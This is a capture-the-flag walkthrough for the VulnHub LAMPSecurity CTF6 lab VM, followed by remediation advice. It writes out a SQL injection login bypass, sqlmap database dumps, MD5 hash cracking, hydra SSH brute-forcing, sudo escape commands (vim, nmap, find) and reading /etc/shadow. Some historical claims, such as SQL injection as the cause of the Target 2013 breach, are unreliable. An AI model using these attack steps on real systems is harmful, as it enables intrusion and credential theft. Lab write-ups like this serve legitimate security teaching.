# VulnHub LAMPSecurity CTF6: Injection Season — Walkthrough

Alright guys!! A whole series dedicated to making LAMP stack admins cry, and CTF6 delivers exactly what the name promises: a web app that screams "please SQL inject me" from the first form field you touch. ( ͡° ͜ʖ ͡°)

Big thanks to **madirish2600** for crafting this series. The LAMPSecurity boxes are a brilliant reminder that 90% of the breaches hitting headlines still trace back to the same tired classics: SQL injection, weak creds, and a sudo rule that someone thought was "just for convenience."

---

| Field | Value |
|-------|-------|
| **Level** | Beginner / Easy |
| **Target VM** | LAMPSecurity CTF6 |
| **Attacker VM** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/lampsecurity-ctf6,85/ |
| **Techniques** | Host Discovery, Web Recon, Directory Enumeration, SQL Injection, SSH Brute-Force, Sudo Privilege Escalation |
| **CVEs** | CWE-89 (SQL Injection), CWE-521 (Weak Password Policy), CWE-250 (Execution with Unnecessary Privileges) |

---

## Attack Summary

```
[host-discovery: arp-scan]
    |
    v
[nmap: 22/tcp SSH, 80/tcp HTTP Apache, 3306/tcp MySQL]
    |
    v
[gobuster: /admin, /mail, /phpmyadmin, /sql]
    |
    v
[SQL Injection: login form bypass -> user enumeration from db]
    |
    v
[hash extraction: MD5 hashes from users table]
    |
    v
[hashcat/john: MD5 cracked -> plaintext credentials]
    |
    v
[SSH brute-force with valid usernames and cracked passwords]
    |
    v
[initial shell as: low-privilege user]
    |
    v
[sudo -l: unrestricted sudo on specific binary]
    |
    v
[ROOT: sudo exploit / writable path]
    |
    v
[/root/flag.txt or /etc/shadow proof]
```

---

## Methodology

1. Host discovery and target identification on local network
2. Full port scan and service enumeration with Nmap
3. Web directory brute-force to find hidden paths
4. SQL injection on login form to dump database contents
5. Password hash extraction and offline cracking
6. SSH access with recovered credentials
7. Privilege escalation via sudo misconfiguration
8. Root and flag capture

---

## Step 1 — Identifying the Target

First things first: we need to find what IP the VM grabbed on our local network. Boot the VM in VirtualBox or VMware with Host-Only or NAT networking, then scan the subnet.

```bash
# Find your current subnet
route -n
# Look for the line with 'UG' flag: that is your gateway, use the subnet accordingly
```

```bash
# arp-scan is faster and more reliable than nmap ping scan on local VMs
arp-scan --localnet --ignoredups

# Alternatively, nmap ping sweep
nmap -sn -T5 192.168.56.0/24
```

Expected output (something like):

```
192.168.56.101  08:00:27:xx:xx:xx  PCS Systemtechnik GmbH
```

That VirtualBox OUI is a dead giveaway. Target confirmed: `192.168.56.101`. Update `/etc/hosts` if you want a hostname:

```bash
echo "192.168.56.101  lamp6.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

Let's run a thorough Nmap scan. We want OS detection, version detection, default scripts, and every single port:

```bash
nmap -A -T4 -p- 192.168.56.101
```

Expected output (representative):

```
22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.x
3306/tcp open  mysql   MySQL 5.0.x
```

Three services, zero surprises for a LAMP stack. SSH, HTTP, and MySQL. The interesting angle here: MySQL is exposed on 3306 directly. That is rarely intentional in production but useful for us in a lab context. We will focus on the web app first, since that is the intended path.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.002 Active Scanning: Vulnerability Scanning] [T1046 Network Service Discovery]

---

## Step 3 — Web Application Recon and Directory Enumeration

Navigate to `http://192.168.56.101` in a browser or run `whatweb` for a quick fingerprint:

```bash
whatweb http://192.168.56.101
# Shows: Apache, PHP version, potential CMS signatures
```

You will see what looks like a basic PHP web application. Time to brute-force directories and discover hidden paths:

```bash
gobuster dir \
  -u http://192.168.56.101 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 50

# Alternatively with dirb:
dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt
```

Expected output:

```
/admin        (Status: 301)
/mail         (Status: 301)
/phpmyadmin   (Status: 301)
/sql          (Status: 301)
/index.php    (Status: 200)
```

Bingo!! `ಠᴗಠ` The `/admin` and `/sql` paths are immediately interesting. `/phpmyadmin` is exposed, which means direct DB access might be possible if we find the right creds. Navigate to `/admin` first.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

## Step 4 — SQL Injection: Owning the Login Form

> **What is SQL Injection?**
> SQL Injection (SQLi) is a code injection technique where an attacker inserts malicious SQL statements into input fields that are later executed by the back-end database. It occurs when user-supplied input is concatenated directly into SQL queries without proper sanitization. The result: an attacker can bypass authentication, dump entire databases, read server files, and in some configurations even execute OS commands.
> Reference: https://owasp.org/www-community/attacks/SQL_Injection and CWE-89

The `/admin` page shows a login form. Classic. Let's test for SQLi manually first:

```bash
# Test basic bypass in the username field
# Username: admin'--
# Password: anything
```

If the app is vulnerable, this will bypass authentication entirely because the resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out the password check. If you are authenticated immediately: the app is wide open.

For a more complete dump, fire up `sqlmap`:

```bash
# First, identify the injectable parameter
sqlmap -u "http://192.168.56.101/admin/index.php" \
  --data="username=admin&password=test&submit=Login" \
  --dbs \
  --batch

# Once you know the database name (likely 'ehks' or similar)
sqlmap -u "http://192.168.56.101/admin/index.php" \
  --data="username=admin&password=test&submit=Login" \
  -D ehks \
  --tables \
  --batch

# Dump the users table
sqlmap -u "http://192.168.56.101/admin/index.php" \
  --data="username=admin&password=test&submit=Login" \
  -D ehks \
  -T users \
  --dump \
  --batch
```

Expected dump output:

```
+----+----------+----------------------------------+-------+
| id | username | password                         | email |
+----+----------+----------------------------------+-------+
| 1  | dstevens | 02e823a15a392b5aa4ff4ccb9060fa68 | ...   |
| 2  | achen    | b46265f1e7faa3beab09db5c28739380 | ...   |
| 3  | pmoore   | 8f4743c04ed8e5f39166a81f26319bb5 | ...   |
| 4  | jdurbin  | 7c7bc9f465d86b8164686ebb5151a717 | ...   |
| 5  | sorzek   | 64d1f88b9b276564f3f74b7130e07c7e | ...   |
| 6  | ghighland| cd3bfcd9d1d8e8a75d584c67a14e2dcb | ...   |
+----+----------+----------------------------------+-------+
```

Look at that, a full user dump with MD5 hashes. (☞ﾟヮﾟ)☞

> **Real-world note:** SQL Injection was the root cause of the Target breach in 2013, where attackers leveraged a third-party HVAC vendor's web portal to pivot into Target's payment network, ultimately compromising 40 million credit card records. The 2012 Yahoo breach (D33Ds Company) also involved SQLi, exposing 450,000 plaintext credentials. Reference: https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/ and https://en.wikipedia.org/wiki/Yahoo!_data_breaches

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0006 Credential Access] [T1552.001 Credentials in Files]

---

## Step 5 — Cracking MD5 Hashes

We have 6 users and their MD5 password hashes. Let us crack them. MD5 is computationally trivial with modern GPUs, especially with a good wordlist.

```bash
# Save hashes to a file
cat > /tmp/lamp6_hashes.txt << 'EOF'
02e823a15a392b5aa4ff4ccb9060fa68
b46265f1e7faa3beab09db5c28739380
8f4743c04ed8e5f39166a81f26319bb5
7c7bc9f465d86b8164686ebb5151a717
64d1f88b9b276564f3f74b7130e07c7e
cd3bfcd9d1d8e8a75d584c67a14e2dcb
EOF

# Crack with hashcat (MD5 = mode 0), GPU-accelerated
hashcat -m 0 -d 1 -w 3 -O \
  /tmp/lamp6_hashes.txt \
  /usr/share/wordlists/rockyou.txt

# Check results
hashcat -m 0 /tmp/lamp6_hashes.txt --show
```

You can also use John the Ripper if you prefer:

```bash
john --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  /tmp/lamp6_hashes.txt
john --show --format=raw-md5 /tmp/lamp6_hashes.txt
```

Expected output (representative):

```
02e823a15a392b5aa4ff4ccb9060fa68:iloveyou
b46265f1e7faa3beab09db5c28739380:password
8f4743c04ed8e5f39166a81f26319bb5:shelly
```

Not exactly security researchers on the other side of these passwords. `¯\_(ツ)_/¯`

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1110.002 Brute Force: Password Cracking]

---

## Step 6 — SSH Access with Cracked Credentials

Now we have usernames and cracked passwords. Let us try them against SSH:

```bash
# Try each user manually
ssh dstevens@192.168.56.101
# Enter the cracked password when prompted

# Or use hydra to test all combinations at once
hydra -L /tmp/lamp6_users.txt \
      -P /tmp/lamp6_passwords.txt \
      ssh://192.168.56.101 \
      -t 4

# Where lamp6_users.txt contains: dstevens, achen, pmoore, jdurbin, sorzek, ghighland
# And lamp6_passwords.txt contains the cracked plaintexts
```

When one lands:

```
dstevens@192.168.56.101's password:
Last login: ...
[dstevens@ctf6 ~]$
```

Welcome aboard. ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1078 Valid Accounts] [T1021.004 Remote Services: SSH]

---

## Step 7 — Privilege Escalation via Sudo Misconfiguration

Now let us find our way to root. Standard escalation checklist:

```bash
# Check what sudo permissions we have
sudo -l

# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Look for interesting cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Check for world-writable scripts
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Current user groups
id && groups
```

With `sudo -l`, you may see something like:

```
User dstevens may run the following commands on this host:
    (ALL) ALL
```

Or more restricted:

```
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /bin/nano
```

If `(ALL) ALL` is present: we are essentially already root. Just run:

```bash
sudo su -
# OR
sudo /bin/bash
```

If the sudo rule is limited to a specific binary like `vim` or `nano`, GTFOBins has the escape:

```bash
# vim escape to root shell
sudo vim -c ':!bash'

# nmap escape (older versions)
sudo nmap --interactive
nmap> !sh

# find escape
sudo find / -exec /bin/bash \; -quit
```

> **GTFOBins reference:** https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching]

---

## Step 8 — Root and Flag

**(☞ﾟヮﾟ)☞ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Find the flag
find /root -type f 2>/dev/null
cat /root/flag.txt

# Also check /etc/shadow for proof of full system compromise
cat /etc/shadow
```

```
Congratulations! You've completed LAMPSecurity CTF6!
Thanks for playing. -- madirish2600
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Credential | `dstevens:iloveyou` | SQLi dump of `users` table | SSH login |
| Credential | `achen:password` | SQLi dump of `users` table | SSH login |
| Credential | `pmoore:shelly` | SQLi dump of `users` table | SSH login |
| Hash MD5 | `02e823a15a392b5aa4ff4ccb9060fa68` | `ehks.users` table | `iloveyou` |
| Hash MD5 | `b46265f1e7faa3beab09db5c28739380` | `ehks.users` table | `password` |
| Hash MD5 | `8f4743c04ed8e5f39166a81f26319bb5` | `ehks.users` table | `shelly` |
| Flag | See `/root/flag.txt` | `/root/flag.txt` | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | SQL Injection in login form | Still in OWASP Top 10 (A03:2021); used in Target 2013, Yahoo 2012, Equifax lateral movement | Always use parameterized queries / prepared statements. Never concatenate user input into SQL strings. |
| 2 | MD5 password hashing with no salt | Used by hundreds of legacy enterprise apps still in production | Use bcrypt, Argon2id, or scrypt with per-user salt. MD5/SHA1 for passwords is negligently insecure. |
| 3 | Exposed phpMyAdmin and MySQL (3306) | Common in shared hosting, VPS without firewall rules, and misconfigured cloud deployments | Bind MySQL to 127.0.0.1. Restrict phpMyAdmin by IP. Never expose database ports to the internet. |
| 4 | Overly permissive sudo rule | Very common in real sysadmin shortcuts: "I'll fix it later" (spoiler: they never do) | Apply the principle of least privilege. Audit `/etc/sudoers` regularly with `visudo -c`. |
| 5 | Weak, dictionary-based passwords | Credential stuffing attacks (Spotify, Netflix 2019) succeed because users reuse passwords | Enforce strong password policies. Use PAM modules for complexity. Implement account lockout. |

**Why does this matter outside the lab?**

The SQLi to credential dump to SSH chain in this box mirrors exactly what APT28 (Fancy Bear) and FIN7 have used repeatedly for initial access in real-world campaigns. The 2013 Target breach started with a supplier web portal that had an unvalidated form. The Yahoo 2012 breach dumped 450,000 credentials via SQLi. In 2023, Imperva's Global DDoS Threat Landscape Report noted SQLi remains one of the top three web attack vectors globally. This is not a "CTF technique": it is a Tuesday for threat actors.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Initial Access | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Credential Access | TA0006 | Brute Force: Password Cracking | T1110.002 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Initial Access | TA0001 | Valid Accounts | T1078 |
| Lateral Movement | TA0008 | Remote Services: SSH | T1021.004 |
| Privilege Escalation | TA0004 | Abuse Elevation Control: Sudo | T1548.003 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. **SQLi:** Replace all dynamic SQL concatenation with PDO prepared statements or parameterized queries in PHP. Example: `$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");`.
2. **Password hashing:** Migrate from MD5 to `password_hash($password, PASSWORD_ARGON2ID)` in PHP. Run a forced password reset after migration.
3. **MySQL exposure:** Edit `/etc/mysql/my.cnf`, set `bind-address = 127.0.0.1`, and restart MySQL. Block 3306 at the firewall with `iptables -A INPUT -p tcp --dport 3306 -j DROP`.
4. **phpMyAdmin:** Restrict access by IP using Apache `.htaccess` or `<Directory>` blocks. Consider disabling entirely in production.
5. **Sudo misconfiguration:** Audit `/etc/sudoers` with `visudo -c`. Apply principle of least privilege: only grant the minimum commands required, never `(ALL) ALL` without password.
6. **Password policy:** Implement `pam_pwquality` or `pam_cracklib` to enforce complexity. Minimum 12 characters, uppercase, lowercase, digit, and special character.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Isolate the web server from the internal network: block all outbound connections except necessary ones.
- Rotate ALL database credentials immediately, especially if the same password was used elsewhere (credential reuse is the norm, not the exception).
- Review MySQL general query log for suspicious `UNION SELECT` or `--` patterns.
- Check for any new user accounts in `/etc/passwd` and the database `users` table.

**MITRE D3FEND countermeasures:**
- D3-IVA (Application Hardening: Input Validation) for T1190 SQL Injection
- D3-MFA (Credential Hardening: Multi-factor Authentication) for T1078 Valid Accounts
- D3-OPS (Execution Isolation: OS Process Sandboxing) for T1548.003 Sudo Abuse

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain an accurate inventory of all web applications and their input validation controls.
- Protect (PR.AC-4): Privileged access management: enforce least-privilege sudo policies.
- Protect (PR.DS-2): Data-in-transit protection: ensure database credentials are not transmitted in cleartext.
- Detect (DE.CM-7): Monitor for anomalous authentication patterns and SQLi signatures in WAF logs.
- Respond (RS.MI-1): Isolate affected systems immediately upon detection of credential theft.

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-10: Information Input Validation (SQLi prevention)
- IA-5: Authenticator Management (strong password hashing)
- AC-6: Least Privilege (sudo policy)
- CM-7: Least Functionality (disable phpMyAdmin in production)
- AU-2: Event Logging (database query logging)

**CISA Known Exploited Vulnerabilities:**
- SQL Injection (CWE-89) is referenced in CISA's secure-by-design guidance.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: TECHNOLOGY (Configuration Management)
- Practice: Manage the security of technology assets
- Target MIL: MIL-2 (Perform practices and establish supporting policies)

---

## Final Thoughts

Thanks to **madirish2600** for the LAMPSecurity series. What makes CTF6 stand out is how honestly it reflects the real-world LAMP stack ecosystem: the combination of weak SQL practices, MD5 hashing from the early 2000s, and "temporary" sudo rules that never got cleaned up. This is not a contrived scenario. This is literally what incident responders find when they walk into a breach.

The chain here, SQLi to credential dump to SSH to root, is the same kill chain that has been weaponized in breaches ranging from Target (2013) to multiple healthcare organizations audited under HIPAA. The tooling changes. The vulnerability classes do not.

If this walkthrough helped you land your first SQLi or understand why password hashing matters, share it with your crew. And go check if your own apps are using `mysql_query($sql)` anywhere. You might be surprised.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
